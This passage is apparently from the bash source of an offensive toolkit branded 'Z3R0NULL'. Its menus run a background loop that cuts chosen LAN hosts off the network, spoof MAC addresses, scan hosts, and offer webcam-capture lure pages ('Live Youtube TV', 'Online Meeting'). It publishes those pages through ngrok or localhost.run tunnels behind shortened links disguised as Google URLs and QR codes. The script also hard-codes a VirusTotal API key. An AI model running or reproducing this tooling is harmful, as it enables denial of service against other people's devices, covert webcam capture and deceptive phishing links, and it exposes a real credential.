    network_host_deauth_scan_complete
}

network_host_deauth_scan_complete(){
    clear
    banner
    echo -e "${bluebold}[* HOST DEAUTH *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] ROUTER -> IP: ${GATEWAYIP} MAC: ${GATEWAYMAC} VENDOR: ${GATEWAYVENDOR}"
    echo -e "${greenbold}[${reset}*${greenbold}] LOCAL  -> IP: ${LOCALIP}   MAC: ${LOCALMAC}   VENDOR: ${LOCALVENDOR}"
    echo -e ""
    echo -e "${greenbold}N°\tIP\t\tMAC\t\t\tSTATUS\tVENDOR${reset}${orangebold}"
    cat HOSTS.csv | awk -F, 'NR > 1 { print "\t" $1 "\t" $2 "\t" $3 "\t" $4 }' | awk '{print NR,$0}'
    echo -e ""
    echo -e "${bluebold}[${reset}99${bluebold}] RESCAN${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' target_ip

    if [[ ${target_ip} == "99" ]];then
    NL=$(cat HOSTS.csv | wc -l | xargs)
    for ALLIP in $(seq 2 ${NL});do
    IP=$(cat HOSTS.csv | awk -F "\"*,\"*" '{print $1}' | sed -n -e ''${ALLIP}'{p;q}')
    STATUS=$(cat HOSTS.csv | awk -F "\"*,\"*" '{print $3}' | sed -n -e ''${ALLIP}'{p;q}')
    if [[ $STATUS == *"BLOCKED"* ]];then
        DEAUTHIP=$(echo $IP | tr -d ".")
        PID=$(ps -h | grep "python $DEAUTHIP.py" | awk NR==1'{print $1}')
        rm -rf $DEAUTHIP.py
        DEAUTHPID=$(cat $DEAUTHIP.tmp | xargs)
        kill $DEAUTHPID
        kill $PID
        rm -rf $DEAUTHIP.tmp
        sleep 0.5
    fi
    done
    rm -rf *.csv
    network_host_deauth_scan
    fi

    if [[ ${target_ip} == "00" ]] || [[ ${target_ip} == "0" ]];then
    NL=$(cat HOSTS.csv | wc -l | xargs)
    for ALLIP in $(seq 2 ${NL});do
    IP=$(cat HOSTS.csv | awk -F "\"*,\"*" '{print $1}' | sed -n -e ''${ALLIP}'{p;q}')
    STATUS=$(cat HOSTS.csv | awk -F "\"*,\"*" '{print $3}' | sed -n -e ''${ALLIP}'{p;q}')
    if [[ $STATUS == *"BLOCKED"* ]];then
        DEAUTHIP=$(echo $IP | tr -d ".")
        PID=$(ps -h | grep "python $DEAUTHIP.py" | awk NR==1'{print $1}')
        rm -rf $DEAUTHIP.py
        DEAUTHPID=$(cat $DEAUTHIP.tmp | xargs)
        kill $DEAUTHPID
        kill $PID
        rm -rf $DEAUTHIP.tmp
        sleep 0.5
    fi
    done
    rm -rf *.csv
    main_menu
    fi

    network_deauther_select_csv=$((${target_ip} + 1))
    IP=$(cat HOSTS.csv | awk -F "\"*,\"*" '{print $1}' | sed -n -e ''${network_deauther_select_csv}'{p;q}')
    MAC=$(cat HOSTS.csv | awk -F "\"*,\"*" '{print $2}' | sed -n -e ''${network_deauther_select_csv}'{p;q}')
    STATUS=$(cat HOSTS.csv | awk -F "\"*,\"*" '{print $3}' | sed -n -e ''${network_deauther_select_csv}'{p;q}')

    if [[ $STATUS == *"ONLINE"* ]];then
    DEAUTHIP=$(echo $IP | tr -d ".")
    sed 's+TARGETIP+'${IP}'+g; s+GATEWAYIP+'${GATEWAYIP}'+g' deauth.py.tmp > $DEAUTHIP.py
    while true;do python $DEAUTHIP.py;done </dev/null &>/dev/null &
    DEAUTHPIDVAR=$!
    echo $DEAUTHPIDVAR >> $DEAUTHIP.tmp
    sed -i "/${MAC}/s/[^,][^,]*/BLOCKED/3" HOSTS.csv
    network_host_deauth_scan_complete
    elif [[ $STATUS == *"BLOCKED"* ]];then
    DEAUTHIP=$(echo $IP | tr -d ".")
    DEAUTHPID=$(cat $DEAUTHIP.tmp | xargs)
    rm -rf $DEAUTHIP.py
    PID=$(ps -h | grep "python $DEAUTHIP.py" | awk NR==1'{print $1}')
    kill $DEAUTHPID
    kill $PID
    rm -rf $DEAUTHIP.tmp
    sed -i "/${MAC}/s/[^,][^,]*/ONLINE /3" HOSTS.csv
    network_host_deauth_scan_complete
    else
    clear
    banner
    error_404
    sleep 1
    network_host_deauth_scan_complete
    fi
}

network_macchanger(){
    clear
    banner
    echo -e "${bluebold}[* SELECT INTERFACE *]${reset}"
    echo -e ""
    if [ -z "$macchanger_interface" ]; then
    # code to execute if the string is not empty
    for i in $(seq 1 "$num_interfaces"); do
    printf "${bluebold}[${reset}0%d${bluebold}] %s${reset}\n" "$i" "$(echo "$wlan_interfaces" | sed -n "${i}p")"
    done
    echo -e "${bluebold}[${reset}00${bluebold}] BACK ${reset}" 
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' macchanger_interface
    selected_interface=$(echo "$wlan_interfaces" | sed -n "${macchanger_interface}p")
    fi

    CURMACWLAN=$(macchanger -s ${selected_interface} |awk 'NR==1{print $3}')
    PERMACWLAN=$(macchanger -s ${selected_interface} |awk 'NR==2{print $3}')
    if [[ ${CURMACWLAN} == *"ERROR"* ]] || [[ ${CURMACWLAN} == "" ]];then
    CURMACWLAN="No such device."
    fi
    if [[ ${PERMACWLAN} == *"ERROR"* ]] || [[ ${PERMACWLAN} == "" ]];then
    PERMACWLAN="No such device."
    fi

    CURMACETH=$(macchanger -s eth0 |awk 'NR==1{print $3}')
    PERMACETH=$(macchanger -s eth0 |awk 'NR==2{print $3}')
    if [[ ${CURMACETH} == *"ERROR"* ]] || [[ ${CURMACETH} == "" ]];then
    CURMACETH="No such device."
    fi
    if [[ ${PERMACETH} == *"ERROR"* ]] || [[ ${PERMACETH} == "" ]];then
    PERMACETH="No such device."
    fi
    clear
    banner
    echo -e "${bluebold}[* SELECT OPTION *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Current Mac:${reset} ${selected_interface} ${CURMACWLAN}"
    echo -e "${greenbold}[${reset}*${greenbold}] Permanent Mac:${reset} ${selected_interface} ${PERMACWLAN}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Current Mac:${reset} eth0 ${CURMACETH}"
    echo -e "${greenbold}[${reset}*${greenbold}] Permanent Mac:${reset} eth0 ${PERMACETH}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] Random Mac${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] Custom Mac${reset}"
    echo -e "${bluebold}[${reset}99${bluebold}] Restore Mac${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' network_macchanger

    if [[ ${network_macchanger} == "01" ]] || [[ ${network_macchanger} == "1" ]];then
    network_macchanger_random
    elif [[ ${network_macchanger} == "02" ]] || [[ ${network_macchanger} == "2" ]];then
    network_macchanger_custom
    elif [[ ${network_macchanger} == "99" ]] || [[ ${network_macchanger} == "99" ]];then
    network_macchanger_restore
    elif [[ ${network_macchanger} == "00" ]] || [[ ${network_macchanger} == "0" ]];then
    network_menu
    else
    clear
    banner
    error_404
    sleep 1
    network_macchanger
    fi
}

network_macchanger_random(){
    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER RANDOM *]${reset}"
    echo -e ""
    for i in $(seq 1 "$num_interfaces"); do
    printf "${bluebold}[${reset}0%d${bluebold}] %s${reset}\n" "$i" "$(echo "$wlan_interfaces" | sed -n "${i}p")"
    done
    echo -e "${bluebold}[${reset}99${bluebold}] eth0${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK ${reset}" 
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' network_macchanger_random

    selected_interface=$(echo "$wlan_interfaces" | sed -n "${network_macchanger_random}p")

    if [[ "$network_macchanger_random" != 0 && "$network_macchanger_random" != 00 && "$network_macchanger_random" =~ ^[0-9]+$ ]]; then
    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER RANDOM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Interface:${reset} ${selected_interface}"
    echo -e "${greenbold}[${reset}*${greenbold}] Changing MAC...${reset}"
    ifconfig ${selected_interface} down
    sleep 2.5
    macchanger -r ${selected_interface}
    sleep 2.5
    ifconfig ${selected_interface} up
    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER RANDOM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Interface:${reset} ${selected_interface}"
    echo -e "${greenbold}[${reset}*${greenbold}] Changing MAC Successful.${reset}"
    sleep 5
    network_macchanger

    elif [[ ${network_macchanger_random} == "99" ]] || [[ ${network_macchanger_random} == "99" ]];then
    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER RANDOM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Interface:${reset} eth0"
    echo -e "${greenbold}[${reset}*${greenbold}] Changing MAC...${reset}"
    ifconfig eth0 down
    sleep 2.5
    macchanger -r eth0
    sleep 2.5
    ifconfig eth0 up
    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER RANDOM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Interface:${reset} eth0"
    echo -e "${greenbold}[${reset}*${greenbold}] Changing MAC Successful.${reset}"
    sleep 5
    network_macchanger

    elif [[ ${network_macchanger_random} == "00" ]] || [[ ${network_macchanger_random} == "0" ]];then
    network_macchanger
    else
    clear
    banner
    error_404
    sleep 1
    network_macchanger_random
    fi
}

network_macchanger_custom(){
    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER CUSTOM *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] WLAN0${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] ETH0${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' network_macchanger_custom

    if [[ ${network_macchanger_custom} == "01" ]] || [[ ${network_macchanger_custom} == "1" ]];then
    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER CUSTOM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Interface:${reset} WLAN0"
    echo -e "${greenbold}[${reset}*${greenbold}] Enter Custom MAC${reset} Ex: XX:XX:XX:XX:XX:XX"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' network_macchanger_custom_enter
    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER CUSTOM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Interface:${reset} WLAN0"
    echo -e "${greenbold}[${reset}*${greenbold}] Changing MAC...${reset}"
    ifconfig wlan0 down
    sleep 2.5
    CHANGEMAC=$(macchanger -m ${network_macchanger_custom_enter} wlan0)
    if [[ ${CHANGEMAC} == *"New MAC"* ]];then
    sleep 2.5
    ifconfig wlan0 up
    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER RANDOM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Interface:${reset} WLAN0"
    echo -e "${greenbold}[${reset}*${greenbold}] Changing MAC Successful.${reset}"
    sleep 5
    network_macchanger
    fi
    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER RANDOM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Interface:${reset} WLAN0"
    echo -e "${greenbold}[${reset}*${greenbold}] Changing MAC ${redbold}ERROR!.${reset}"
    sleep 5
    network_macchanger
    elif [[ ${network_macchanger_custom} == "02" ]] || [[ ${network_macchanger_custom} == "2" ]];then
    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER CUSTOM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Interface:${reset} ETH0"
    echo -e "${greenbold}[${reset}*${greenbold}] Enter Custom MAC${reset} Ex: XX:XX:XX:XX:XX:XX"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' network_macchanger_custom_enter
    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER CUSTOM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Interface:${reset} ETH0"
    echo -e "${greenbold}[${reset}*${greenbold}] Changing MAC...${reset}"
    ifconfig eth0 down
    sleep 2.5
    CHANGEMAC=$(macchanger -m ${network_macchanger_custom_enter} eth0)
    if [[ ${CHANGEMAC} == *"New MAC"* ]];then
    sleep 2.5
    ifconfig eth0 up
    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER RANDOM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Interface:${reset} ETH0"
    echo -e "${greenbold}[${reset}*${greenbold}] Changing MAC Successful.${reset}"
    sleep 5
    network_macchanger
    fi
    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER RANDOM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Interface:${reset} ETH0"
    echo -e "${greenbold}[${reset}*${greenbold}] Changing MAC ${redbold}ERROR!.${reset}"
    sleep 5
    network_macchanger
    elif [[ ${network_macchanger_custom} == "00" ]] || [[ ${network_macchanger_custom} == "0" ]];then
    network_macchanger
    else
    clear
    banner
    error_404
    sleep 1
    network_macchanger_custom
    fi
}

network_macchanger_restore(){
    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER RESTORE *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Restoring MAC ETH0...${reset}"
    ifconfig eth0 down
    macchanger -p eth0
    ifconfig eth0 up
    sleep 2.5
    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER RESTORE *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Restoring MAC ETH0 Successful.${reset}"
    sleep 2.5

    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER RESTORE *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Restoring MAC WLAN0...${reset}"
    ifconfig wlan0 down
    macchanger -p wlan0
    ifconfig wlan0 up
    sleep 2.5
    clear
    banner
    echo -e "${bluebold}[* MAC CHANGER RESTORE *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Restoring MAC WLAN0 Successful.${reset}"
    sleep 2.5

    network_macchanger
}

host_scanner(){
    NETWORKRST="FALSE"
    clear
    banner
    echo -e "${bluebold}[* HOST SCAN *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] WLAN0${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' network_host_deauth_interface

    if [[ $network_host_deauth_interface == "01" ]] || [[ $network_host_deauth_interface == "1" ]];then
    INTERFACENAME="WLAN0"
    clear
    banner
    echo -e "${bluebold}[* HOST SCAN *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Configuring LocalHost...${reset}"
    LOCALIP=$(ifconfig | sed -n '/wlan0/,$p' | grep "inet" | cut -d " " -f 10 | awk 'NR==1{print $1}')
    LOCALMAC=$(ifconfig | sed -n '/wlan0/,$p' | grep "ether" | cut -d " " -f 10 | awk 'NR==1{print $1}')
    LOCALNAME=$(host ${LOCALIP} | awk NR==1 | sed -n -e 's/^.*domain name pointer //p')
    if [ -z "$LOCALNAME" ]; then
    LOCALNAME="NULL"
    fi
    LOCALVENDOR=$(curl -s https://api.macvendors.com/${LOCALMAC} | sed 's/,//g')
    INTIP255=$(ifconfig | sed -n '/wlan0/,$p' | grep "broadcast" | cut -d " " -f 10 | cut -d "." -f 1,2,3 | awk 'NR==1{print $1}')
    GATEWAYMAC=$(arping -c 1 -i wlan0 $(netstat -nr | grep "wlan0" | awk '$1 == "0.0.0.0"{print$2}') | grep -o -E '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}')
    if [[ ${GATEWAYMAC} == "" ]] || [[ ${GATEWAYMAC} == " " ]];then
    clear
    banner
    error_404
    sleep 1
    network_menu
    fi
    network_host_scan
    elif [[ ${network_host_deauth_interface} == "0" ]] || [[ ${network_host_deauth_interface} == "00" ]];then
    network_menu
    else
    clear
    banner
    error_404
    sleep 1
    host_scanner
    fi
}

network_host_scan(){
    cd $script_dir/.files || exit_script
    clear
    banner
    echo -e "${bluebold}[* HOST SCAN *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Scanning Hosts...${reset}"
    python scan.py ARP ${INTIP255}.0/24
    sleep 1
    sed -i 's/ONLINE/CLIENT/g' HOSTS.tmp
    sed -i "/${GATEWAYMAC}/s/[^,][^,]*/ROUTER/3" HOSTS.tmp
    SAVE="${LOCALIP},${LOCALMAC},LOCAL,${LOCALNAME},${LOCALVENDOR}"
    echo ${SAVE} >> HOSTS.tmp
    sleep 0.5
    cat HOSTS.tmp | (sed -u 1q;sort --field-separator="," -b -k1,1) >> HOSTS.csv
    rm -rf HOSTS.tmp
    NL=$(cat HOSTS.csv | wc -l | xargs)
    for CHK in $(seq 2 ${NL});do
        IP=$(cat HOSTS.csv | awk -F "\"*,\"*" '{print $1}' | sed -n -e ''${CHK}'{p;q}')
        MAC=$(cat HOSTS.csv | awk -F "\"*,\"*" '{print $2}' | sed -n -e ''${CHK}'{p;q}')
        NAME=$(host ${IP} | awk NR==1 | sed -n -e 's/^.*domain name pointer //p')
            if [[ ${NAME} == "" ]];then
                NAME="NULL"
            fi
        sed -i "/${MAC}/s/[^,][^,]*/${NAME}/4" HOSTS.csv
        sleep 0.5
    done
    network_host_scan_complete
}

network_host_scan_complete(){
    clear
    banner
    echo -e "${bluebold}[* HOST SCAN *]${reset}"
    echo -e ""
#    echo -e "${greenbold}N°\tIP\t\tMAC\t\t\tSTATUS\tHOSTNAME\tVENDOR${reset}${orangebold}"
#    cat HOSTS.csv | awk -F, 'NR > 1 { print "\t" $1 "\t" $2 "\t" $3 "\t" $4 "\t" $5 }' | awk '{print NR,$0}'
    cat HOSTS.csv | awk -F, 'NR == 1 { printf "%-8s%-15s%-20s%-10s%-11s%-11s\n", "N°", "IP", "MAC", "STATUS", "HOSTNAME", "VENDOR" } NR > 1 { printf "%-8d%-15s%-20s%-10s%-11s%-11s\n", NR, $1, $2, $3, $4, $5 }'

    echo -e ""
    echo -e "${bluebold}[${reset}99${bluebold}] RESCAN${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' network_host_scan_complete

    if [[ ${network_host_scan_complete} == "99" ]];then
    rm -rf *.csv
    network_host_scan
    elif [[ ${network_host_scan_complete} == "00" ]] || [[ ${network_host_scan_complete} == "0" ]];then
    rm -rf *.csv
    network_menu
    else
    clear
    banner
    error_404
    sleep 1
    network_host_scan_complete
    fi
}

#Restart Network
network_restart(){
    clear
    banner
    network_restarting
    sleep 1
    ifconfig wlan0 down &>/dev/null
    ifconfig wlan1 down &>/dev/null
    ifconfig wlan2 down &>/dev/null
    airmon-ng stop wlan0mon &>/dev/null
    airmon-ng stop wlan1mon &>/dev/null
    airmon-ng stop wlan2mon &>/dev/null
    iwconfig wlan0 mode managed &>/dev/null
    iwconfig wlan1 mode managed &>/dev/null
    iwconfig wlan2 mode managed &>/dev/null
    ifconfig wlan0 up &>/dev/null
    ifconfig wlan1 up &>/dev/null
    ifconfig wlan2 up &>/dev/null
    systemctl restart NetworkManager &>/dev/null
    clear
    banner
    network_restarted
    sleep 1
    NETWORKRST="FALSE"
    network_menu
}

#WebCam Menu
webcam_menu(){
    clear
    banner
    echo -e "${bluebold}[* SELECT SITE *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] Live Youtube TV${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] Online Meeting${reset}"
    echo -e "${bluebold}[${reset}03${bluebold}] Hello${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' webcam_menu

    if [[ ${webcam_menu} == "01" ]] || [[ ${webcam_menu} == "1" ]];then
    site="webcam"
    webcam_youtube_template
    elif [[ ${webcam_menu} == "02" ]] || [[ ${webcam_menu} == "2" ]];then
    site="webcam"
    select_server
    elif [[ ${webcam_menu} == "03" ]] || [[ ${webcam_menu} == "3" ]];then
    site="webcam"
    select_server
    elif [[ ${webcam_menu} == "00" ]] || [[ ${webcam_menu} == "0" ]];then
    main_menu
    else
    clear
    banner
    error_404
    sleep 1
    webcam
    fi
}

#Webcam Template YT Video
webcam_youtube_template(){
    clear
    banner
    echo -e "${bluebold}[* WEBCAM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter youtube video ID.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' webcam_youtube_template
    select_server
}

#Servers Options Menu
server_select(){
    clear
    banner
    echo -e "${bluebold}[* SELECT SERVER *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] NGROK"${reset}
    echo -e "${bluebold}[${reset}02${bluebold}] SSH${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' server_select

    if [[ ${server_select} == "01" ]] || [[ ${server_select} == "1" ]];then
    ngrok_server
    elif [[ ${server_select} == "02" ]] || [[ ${server_select} == "2" ]];then
    server_ssh
    elif [[ ${server_select} == "00" ]] || [[ ${server_select} == "0" ]];then
    main_menu
    else
    clear
    banner
    error_404
    sleep 1
    server_select
    fi
}

#Server Ngrok Start Custom
ngrok_server(){
    clear
    banner
    echo -e "${bluebold}[* NGROK SERVER *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Your custom index directory.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' server_index_dir

    clear
    banner
    php_starting
    sleep 3
    cd ${server_index_dir} || exit_script
    php -S ${host}:${port} > /dev/null 2>&1 &
    cd ${script_dir}/ || exit_script
    clear
    banner
    php_started
    sleep 2
    clear
    banner
    ngrok_starting
    sleep 3
    ${script_dir}/.files/ngrok http ${host}:${port} > /dev/null 2>&1 &
    clear
    banner
    ngrok_started
    sleep 2
    clear
    banner
    sleep 2
    link=$(curl -s -f http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^\"]*')
    shorturl=$(curl -s "http://tinyurl.com/api-create.php?url=${link}" | head -n1)
    ngrok_short_hidden=$(curl -s --data "url=${link}&shorturl=&opt=0" https://is.gd/create.php | html2text | grep "https" | head -n 1 | sed 's/\[//' | sed 's/\]//' | sed 's/https:\/\///')
	ngrok_short_hidden_result_google="https://www.google.com%7AGoogle%Oficial@${ngrok_short_hidden}"

    echo -e "${bluebold}[* NGROK *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Link Local:${reset} http://${host}:${port}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Online:${reset} ${link}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Short:${reset} ${shorturl}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Short Hidden Google:${reset} ${ngrok_short_hidden_result_google}"
    echo -e "${greenbold}[${reset}*${greenbold}] QR Code:${reset} ${script_dir}/QRCode.png"
    echo -e ""

    if [[ -z ${link} ]];then
    clear
    banner
    echo -e "${redbold}[${reset}*${redbold}] ERROR LINK NOT FOUND 404.${reset}"
    echo -e "${redbold}[${reset}*${redbold}] CHECK INTERNET CONNECTION.${reset}"
    echo -e "${redbold}[${reset}*${redbold}] CHECK NGROK AUTH TOKEN.${reset}"
    echo -e "${redbold}[${reset}*${redbold}] TRY AGAIN.${reset}"
    sleep 10
    exit_script
    fi

    qrencode -m 5 -s 10 -o QRCode.png ${link} > /dev/null 2>&1 &
    feh QRCode.png > /dev/null 2>&1 &

    sleep infinity
}

#Server SSH Start Custom
server_ssh(){
    clear
    banner
    echo -e "${bluebold}[* SSH SERVER *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Your custom index directory.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' server_index_dir

    clear
    banner
    php_starting
    sleep 3
    cd ${server_index_dir} || exit_script
    php -S ${host}:${port} > /dev/null 2>&1 &
    cd ${script_dir}/ || exit_script
    clear
    banner
    php_started
    sleep 2
    clear
    banner
    ssh_starting
    sleep 3
    $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:'${host}':'${port}' nokey@localhost.run 2> /dev/null > '${script_dir}/.files/link'' &
    clear
    banner
    ssh_started
    sleep 2
    clear
    banner
    sleep 2
    link=$(cat ${script_dir}/.files/link | grep -o 'https://[^\"]*')
    shorturl=$(curl -s "http://tinyurl.com/api-create.php?url=${link}" | head -n1)
    ssh_short_hidden=$(curl -s --data "url=${link}&shorturl=&opt=0" https://is.gd/create.php | html2text | grep "https" | head -n 1 | sed 's/\[//' | sed 's/\]//' | sed 's/https:\/\///')
	ssh_short_hidden_result_google="https://www.google.com%7AGoogle%Oficial@${ssh_short_hidden}"

    echo -e "${bluebold}[* SSH *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Link Local:${reset} http://${host}:${port}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Online:${reset} ${link}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Short:${reset} ${shorturl}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Short Hidden Google:${reset} ${ssh_short_hidden_result_google}"
    echo -e "${greenbold}[${reset}*${greenbold}] QR Code:${reset} ${script_dir}/QRCode.png"
    echo -e ""

    if [[ -z ${link} ]];then
    clear
    banner
    echo -e "${redbold}[${reset}*${redbold}] ERROR LINK NOT FOUND 404.${reset}"
    echo -e "${redbold}[${reset}*${redbold}] CHECK INTERNET CONNECTION.${reset}"
    echo -e "${redbold}[${reset}*${redbold}] TRY AGAIN.${reset}"
    sleep 10
    exit_script
    fi

    qrencode -m 5 -s 10 -o QRCode.png ${link} > /dev/null 2>&1 &
    feh QRCode.png > /dev/null 2>&1 &

    sleep infinity
}

#
virus_scan_menu(){
    API_KEY_VT="82fffad16f62f98de0a78dc4ea1c33805f21684b2b696ffd86819782f9bfc189"
    clear
    banner
    echo -e "${bluebold}[* SELECT OPTION *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] Scan File"${reset}
    echo -e "${bluebold}[${reset}02${bluebold}] Scan URL${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' virus_scan_menu

    if [[ ${virus_scan_menu} == "01" ]] || [[ ${virus_scan_menu} == "1" ]];then
    virus_scan_file_dir
    elif [[ ${virus_scan_menu} == "02" ]] || [[ ${virus_scan_menu} == "2" ]];then
    virus_scan_url
    elif [[ ${virus_scan_menu} == "00" ]] || [[ ${virus_scan_menu} == "0" ]];then
    main_menu
    else
    clear
    banner
    error_404
    sleep 1
    virus_scan_menu
    fi
}

virus_scan_file_dir(){
    clear
    banner
    echo -e "${bluebold}[* VIRUS SCAN FILE *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter File Directory.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' virus_scan_file_dir

    MD5_VT=$(md5sum ${virus_scan_file_dir} | awk '{print $1}')
    FileSize=$(stat ${virus_scan_file_dir} | grep "Size:" | awk '{print $2}')
    if [[ ${FileSize} -gt 33554432 ]];then
    virus_scan_file_upload_large
    else
    virus_scan_file_upload_small
    fi
}

virus_scan_file_upload_small(){
    clear
    banner
    echo -e "${bluebold}[* VIRUS SCAN FILE *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Uploading File...${reset} ${virus_scan_file_dir}"
    UPLOAD_VT=$(curl -s --request POST --url https://www.virustotal.com/api/v3/files --header 'Content-Type: multipart/form-data' --header "x-apikey: ${API_KEY_VT}" --form file=@${virus_scan_file_dir} --progress-bar)
    sleep1

    clear
    banner
    echo -e "${bluebold}[* VIRUS SCAN FILE *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Analyzing File... 120 Seconds.${reset}"
    ANALYZE_VT=$(curl -s --request POST --url https://www.virustotal.com/api/v3/files/${MD5_VT}/analyse --header "x-apikey: ${API_KEY_VT}" --progress-bar)
    sleep 120

    clear
    banner
    echo -e "${bluebold}[* VIRUS SCAN FILE *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] File Analyzed.${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Searching Results... 5 Seconds.${reset}"
    sleep 5

    cd ${script_dir}/.files || exit_script
    RESULTS_VT=$(curl -s --request GET --url https://www.virustotal.com/api/v3/files/${MD5_VT} --header "x-apikey: ${API_KEY_VT}" > FILERESULTS.json)

    NAMEFILE=$(basename ${virus_scan_file_dir})
    NAMES=$(jq '.[] | .attributes.names[]' FILERESULTS.json | xargs)
    NAMEMEAN=$(jq '.[] | .attributes.meaningful_name' FILERESULTS.json | xargs)
    SIZEBYTES=$(jq '.[] | .attributes.size' FILERESULTS.json | xargs)
    SIZE=$(numfmt --to=iec --format "%10.2f" ${SIZEBYTES} | xargs)
